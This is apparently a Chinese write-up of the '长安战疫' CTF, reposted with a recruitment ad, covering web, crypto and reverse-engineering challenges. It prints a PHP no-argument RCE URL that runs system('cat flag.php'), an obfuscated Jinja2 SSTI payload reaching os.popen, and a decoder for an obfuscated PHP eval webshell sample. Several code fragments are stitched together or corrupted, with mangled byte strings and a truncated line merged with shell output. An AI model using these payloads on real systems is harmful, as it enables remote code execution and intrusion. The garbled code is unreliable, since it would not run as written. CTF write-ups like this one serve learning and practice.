# 长安战疫-WriteUp

> 原文: https://www.ctfiot.com/22102.html
> ID: 22102

无参 RCE

http://af1c87ad.lxctf.net/?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&a=system(%27cat%20flag.php%27); flag{9a7f25934fe3d84e150ff4e02c2198f5}

F12 发现可以传递 name 参数 接下来是 SSTI

http://fae6f87d.lxctf.net/admin?name={{2*2}}.js? 参考https://blog.csdn.net/qq_38154820/article/details/111399386

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
{%print(lipsum|attr(%22u005fu005fu0067u006cu006fu0062u0061u006cu0073u005fu005f%22))|attr(%22u005fu005fu0067u0065u0074u0069u0074u0065u006du005fu005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%}
战长恙长战恙河长山山安战疫疫战疫安疫长安恙
str='FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]'
new=[]
for i in str:
    if i >='D' and i <='Z':
        new.append(chr(ord(i) - 3))
    elif i=='A':
        new.append('X')
    elif i=='B':
        new.append('Y')
    elif i=='C':
        new.append('Z')
    elif i=='?':
        new.append('_')
    else:
        new.append(chr(ord(i) + 32))
print(new)
234: compiled Java class data, version 52.0 (Java 1.8)
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//
public class Main {
    public Main() {
    }
    public static void main(String[] var0) {
        byte[] var10000 = new byte[]{77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61};
    }
}
MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDEx
MTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAx
MFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAx
MTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDEx
MTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEw
MDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAw
MDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAw
MTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDEx
MDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEw
MTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAw
MDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTEx
MDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAw
MDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxu
MDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAw
MDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEw
MVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEw
MTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEw
MDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAw
MTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAw
MTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEw
MTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAw
MTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAx
MDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTEx
MTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDEx
MTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDEx
MDAwMDAwMDEwMDAxMTAwMA==
#DusPFr="bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA=="
DusPFr="n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37jdqtwyiOeAcUZLpCuHnbmgvFsfSaPYlMJBNjRVkKxQDTWIrzEoXGh"
arCiCL=(DusPFr[3]+DusPFr[6]+DusPFr[33]+DusPFr[30])
print(arCiCL)#base
VvUrBZ=(DusPFr[33]+DusPFr[10]+DusPFr[24]+DusPFr[10]+DusPFr[24])
print(VvUrBZ)#strtr
DEomKk=(VvUrBZ[0]+DusPFr[18]+DusPFr[3]+VvUrBZ[0]+VvUrBZ[1]+DusPFr[24])
print(DEomKk)#substr
LnpnvY=DusPFr[7]+DusPFr[13]
print(LnpnvY)#52
print(DusPFr[22]+DusPFr[36]+DusPFr[29]+DusPFr[26]+DusPFr[30]+DusPFr[32]+DusPFr[35]+DusPFr[26]+DusPFr[30])
#);$arCiCL=$DusPFr[3].$DusPFr[6].$DusPFr[33].$DusPFr[30];$VvUrBZ=$DusPFr[33].$DusPFr[10].$DusPFr[24].$DusPFr[10].$DusPFr[24];$DEomKk=$VvUrBZ[0].$DusPFr[18].$DusPFr[3].$VvUrBZ[0].$VvUrBZ[1].$DusPFr[24];$LnpnvY=$DusPFr[7].$DusPFr[13];$arCiCL.=$DusPFr[22].$DusPFr[36].$DusPFr[29].$DusPFr[26].$DusPFr[30].$DusPFr[32].$DusPFr[35].$DusPFr[26].$DusPFr[30];eval($arCiCL("JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=")
echo(strtr(substr($VCBZQW,52*2),substr($VCBZQW,52,52),substr($VCBZQW,0,52)));
./stegosaurus -x steg.pyc
n = 10104483468358610819
R = IntegerModRing(n)
d = [0,2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]
M = Matrix(R,[[d[2],d[3],d[4]],[d[1],d[2],d[3]],[1,1,1]])
res = vector(R,d[3:])
M.solve_left(res)
# a,b,c = (5490290802446982981, 8175498372211240502, 6859390560180138873)
# bytes.fromhex(hex(a)[2:])+bytes.fromhex(hex(b)[2:])+bytes.fromhex(hex(c)[2:])

# L1near_Equ4t1on6_1s_34sy
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
def pad(m):
    tmp = 16-(len(m)%16)
    return m + bytes([tmp for _ in range(tmp)])

def decrypt(m,key):
    aes = AES.new(key,AES.MODE_ECB)
    return aes.decrypt(m)
c = b'x9dx18Kx84nxb8b|x18xad4xc6xfcxecxfex14x0b_Txe3x1bx03Qx96ex9exb8MQxd5xc3x1c'
for i in range(2**20):
    key = pad(long_to_bytes(i))
    try:
        m = decrypt(c,key)
        if b"cazy" in m:
            print(m)
            break
        else:
            continue
    
except:
        continue
# cazy{n0_c4n,bb?n0p3!}
from Crypto.Util.number import *
flag = b'cazy{'
c = b' echo "ZmxhZ3tDaDFuYV95eWRzX2Nhenl9" | base64 -d
flag{Ch1na_yyds_cazy}/usr/bin/base64: invalid input
import threading
import time

def encode_1(n):
    global num
    if num >= 0:
        flag[num] = flag[num] ^ num
        num -= 1
        time.sleep(1)
    if num <= 0:
        pass

def encode_2(n):
    global num
    if num >= 0:
        flag[num] = flag[num] ^ flag[num + 1]
        num -= 1
        time.sleep(1)
    if num < 0:
        pass

Happy = [
    44,
    100,
    3,
    50,
    106,
    90,
    5,
    102,
    10,
    112]
num = 9
f = input('Please input your flag:')
if len(f) != 10:
    print('Your input is illegal')
flag = list(f)
j = 0
print("flag to 'ord':", flag)
t1 = threading.Thread(encode_1, (1,), **('target', 'args'))
t2 = threading.Thread(encode_2, (2,), **('target', 'args'))
t1.start()
time.sleep(0.5)
t2.start()
t1.join()
t2.join()
if flag == Happy:
    print('Good job!')
print('No no no!')
f[9]^=9,num=8
f[8]^=f[9],num=7
f[7]^=7,num=6
f[6]^=f[7],num=5
f[5]^=5,num=4
f[4]^=f[5],num=3
f[3]^=3,num=2
f[2]^=f[3],num=1
f[1]^=1,num=0
f[0]^=f[1],num=-1
a=[44,
    100,
    3,
    50,
    106,
    90,
    5,
    102,
    10,
    112]
